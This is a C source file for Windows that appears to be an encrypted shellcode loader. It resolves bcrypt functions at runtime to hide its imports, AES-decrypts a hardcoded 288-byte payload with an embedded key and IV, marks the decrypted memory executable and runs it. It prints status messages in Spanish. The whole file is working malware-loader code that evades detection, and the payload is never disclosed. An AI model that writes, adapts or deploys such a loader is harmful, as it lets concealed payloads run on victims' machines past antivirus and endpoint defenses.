#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>

#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)

typedef NTSTATUS(WINAPI* BCryptOpenAlgorithmProvider_t)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS(WINAPI* BCryptGetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, PULONG, ULONG);
typedef NTSTATUS(WINAPI* BCryptSetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* BCryptGenerateSymmetricKey_t)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* BCryptDecrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, PULONG, ULONG);
typedef NTSTATUS(WINAPI* BCryptDestroyKey_t)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS(WINAPI* BCryptCloseAlgorithmProvider_t)(BCRYPT_ALG_HANDLE, ULONG);

typedef struct {
    PBYTE pCipherText;
    DWORD dwCipherSize;
    PBYTE pKey;
    PBYTE pIv;
} AES_CONTEXT;

BOOL DecryptAES(AES_CONTEXT* pCtx, PBYTE* ppPlainText, PDWORD pdwPlainSize) {
    HMODULE hBCrypt = LoadLibraryA("bcrypt.dll");
    if (!hBCrypt) return FALSE;

    BCryptOpenAlgorithmProvider_t BCryptOpenAlgorithmProvider = (BCryptOpenAlgorithmProvider_t)GetProcAddress(hBCrypt, "BCryptOpenAlgorithmProvider");
    BCryptGetProperty_t BCryptGetProperty = (BCryptGetProperty_t)GetProcAddress(hBCrypt, "BCryptGetProperty");
    BCryptSetProperty_t BCryptSetProperty = (BCryptSetProperty_t)GetProcAddress(hBCrypt, "BCryptSetProperty");
    BCryptGenerateSymmetricKey_t BCryptGenerateSymmetricKey = (BCryptGenerateSymmetricKey_t)GetProcAddress(hBCrypt, "BCryptGenerateSymmetricKey");
    BCryptDecrypt_t BCryptDecrypt = (BCryptDecrypt_t)GetProcAddress(hBCrypt, "BCryptDecrypt");
    BCryptDestroyKey_t BCryptDestroyKey = (BCryptDestroyKey_t)GetProcAddress(hBCrypt, "BCryptDestroyKey");
    BCryptCloseAlgorithmProvider_t BCryptCloseAlgorithmProvider = (BCryptCloseAlgorithmProvider_t)GetProcAddress(hBCrypt, "BCryptCloseAlgorithmProvider");

    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = 0;
    DWORD dwBlockSize = 0;
    DWORD cbKeyObject = 0;
    PBYTE pbKeyObject = NULL;
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = 0;
    NTSTATUS STATUS = 0;

    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) { FreeLibrary(hBCrypt); return FALSE; }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); FreeLibrary(hBCrypt); return FALSE; }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); FreeLibrary(hBCrypt); return FALSE; }

    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (!pbKeyObject) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); FreeLibrary(hBCrypt); return FALSE; }

    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) { free(pbKeyObject); BCryptCloseAlgorithmProvider(hAlgorithm, 0); FreeLibrary(hBCrypt); return FALSE; }

    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, pCtx->pKey, 32, 0);
    if (!NT_SUCCESS(STATUS)) { free(pbKeyObject); BCryptCloseAlgorithmProvider(hAlgorithm, 0); FreeLibrary(hBCrypt); return FALSE; }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pCtx->pCipherText, (ULONG)pCtx->dwCipherSize, NULL, pCtx->pIv, 16, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) { BCryptDestroyKey(hKeyHandle); free(pbKeyObject); BCryptCloseAlgorithmProvider(hAlgorithm, 0); FreeLibrary(hBCrypt); return FALSE; }

    pbPlainText = (PBYTE)malloc(cbPlainText);
    if (!pbPlainText) { BCryptDestroyKey(hKeyHandle); free(pbKeyObject); BCryptCloseAlgorithmProvider(hAlgorithm, 0); FreeLibrary(hBCrypt); return FALSE; }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pCtx->pCipherText, (ULONG)pCtx->dwCipherSize, NULL, pCtx->pIv, 16, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) { free(pbPlainText); BCryptDestroyKey(hKeyHandle); free(pbKeyObject); BCryptCloseAlgorithmProvider(hAlgorithm, 0); FreeLibrary(hBCrypt); return FALSE; }

    BCryptDestroyKey(hKeyHandle);
    free(pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    FreeLibrary(hBCrypt);

    *ppPlainText = pbPlainText;
    *pdwPlainSize = cbPlainText;
    return TRUE;
}


unsigned char AesKey[32] = { 0xC0, 0x0B, 0x81, 0x25, 0x88, 0x72, 0x2A, 0xE3, 0xC3, 0xD2, 0x21, 0x43, 0xC1, 0xBE, 0x17, 0x1E, 0x8D, 0xFE, 0x71, 0xA5, 0x5E, 0xC9, 0x1F, 0x4C, 0x41, 0x9D, 0x8C, 0xEE, 0x9C, 0x9D, 0x7E, 0xAF };
unsigned char AesIv[16] = { 0xD2, 0xA0, 0x8F, 0x2A, 0x1E, 0x6E, 0x9F, 0x23, 0x0C, 0x50, 0x44, 0xCA, 0x66, 0x0A, 0x66, 0xAD };
unsigned char AesCipherText[288] = {
    0x38, 0xB6, 0xAF, 0x6E, 0x11, 0x55, 0x39, 0xDA, 0xAB, 0xD6, 0xB7, 0x91,
    0x0F, 0x17, 0x2B, 0xCB, 0xE0, 0xA4, 0x63, 0x9C, 0xF3, 0x94, 0xDF, 0x57,
    0x77, 0x06, 0x8D, 0xBB, 0x7C, 0xD7, 0xF1, 0x6F, 0x7B, 0x8A, 0xF5, 0x94,
    0x3F, 0xB0, 0x71, 0x68, 0x02, 0x4D, 0x37, 0xAC, 0x2E, 0x53, 0xFF, 0xB8,
    0xE0, 0x57, 0xA8, 0x05, 0x72, 0x73, 0x5A, 0x3A, 0xB5, 0x6F, 0xF5, 0x09,
    0x1C, 0x0F, 0x33, 0x05, 0xE0, 0x16, 0x84, 0x5F, 0x7E, 0x7E, 0x2D, 0xAE,
    0x14, 0x39, 0xBE, 0x1C, 0x5F, 0x11, 0x6D, 0x27, 0x17, 0x32, 0x16, 0xF1,
    0x08, 0x64, 0xED, 0xA6, 0xE1, 0x36, 0x68, 0x54, 0xE4, 0x0D, 0x26, 0xBF,
    0xA8, 0xC4, 0x0F, 0x0D, 0x5B, 0x03, 0xA4, 0xE2, 0x9E, 0x01, 0x82, 0xE8,
    0xDD, 0x19, 0x1E, 0x2C, 0x82, 0x6F, 0x0E, 0x63, 0x49, 0xD9, 0x50, 0x1B,
    0xBE, 0x51, 0x44, 0x8A, 0x53, 0x3C, 0xA0, 0x05, 0xB0, 0xDC, 0xDC, 0x54,
    0x08, 0xF8, 0x77, 0x1C, 0xCF, 0xE5, 0x39, 0xF7, 0xAE, 0xDF, 0x60, 0x0B,
    0x73, 0x32, 0x17, 0xCE, 0x71, 0xAD, 0x14, 0x60, 0xB8, 0x24, 0x77, 0x01,
    0x43, 0x0A, 0xAE, 0xFB, 0x30, 0xF3, 0x2C, 0xAE, 0xB7, 0x30, 0x54, 0x6C,
    0x16, 0xE7, 0xF0, 0xCD, 0x4C, 0xAB, 0x87, 0x95, 0x35, 0x37, 0x8A, 0x93,
    0x27, 0xFF, 0x60, 0x82, 0x2D, 0xEB, 0x52, 0xD9, 0xE8, 0x07, 0x1B, 0x5F,
    0x04, 0x3D, 0xDF, 0x03, 0x12, 0xD7, 0xCD, 0xBF, 0xB9, 0x68, 0x4C, 0x30,
    0x63, 0x01, 0x54, 0x15, 0x3E, 0x3F, 0x38, 0x98, 0xAE, 0xB0, 0xF9, 0x27,
    0x32, 0x6F, 0xB2, 0xF4, 0xD3, 0x49, 0x9C, 0x3E, 0xD9, 0xE0, 0xDF, 0xD4,
    0xC8, 0xFF, 0x01, 0x8D, 0xDA, 0x4E, 0x9E, 0xDD, 0x51, 0xE5, 0xC2, 0xBB,
    0xBE, 0xC0, 0x35, 0x9E, 0x89, 0xEE, 0xF3, 0xCC, 0xE5, 0x32, 0xA5, 0x07,
    0xED, 0x08, 0x5C, 0xC5, 0x98, 0xEB, 0x87, 0xCE, 0xC1, 0x79, 0x4C, 0xBD,
    0xC4, 0x2F, 0x1C, 0x56, 0x38, 0xE5, 0x76, 0xAF, 0x7B, 0x72, 0x3E, 0xD1,
    0x7B, 0xE8, 0xA1, 0xBA, 0xCE, 0xAB, 0xE5, 0xB7, 0xAA, 0x7E, 0x9F, 0x58,
};

int main(void) {
    PBYTE pPlainText = NULL;
    DWORD dwPlainSize = 0;
    DWORD dwOldProtect = 0;

    AES_CONTEXT ctx = {
        .pCipherText = AesCipherText,
        .dwCipherSize = sizeof(AesCipherText),
        .pKey = AesKey,
        .pIv = AesIv
    };

    printf("[*] Descifrando...\n");
    if (!DecryptAES(&ctx, &pPlainText, &dwPlainSize)) {
        printf("[-] Error\n");
        return -1;
    }

    printf("[+] Descifrado: %lu bytes\n", dwPlainSize);

    PVOID pExec = VirtualAlloc(0, dwPlainSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(pExec, pPlainText, dwPlainSize);
    free(pPlainText);

    VirtualProtect(pExec, dwPlainSize, PAGE_EXECUTE_READ, &dwOldProtect);
    ((void(*)())pExec)();

    return 0;
}
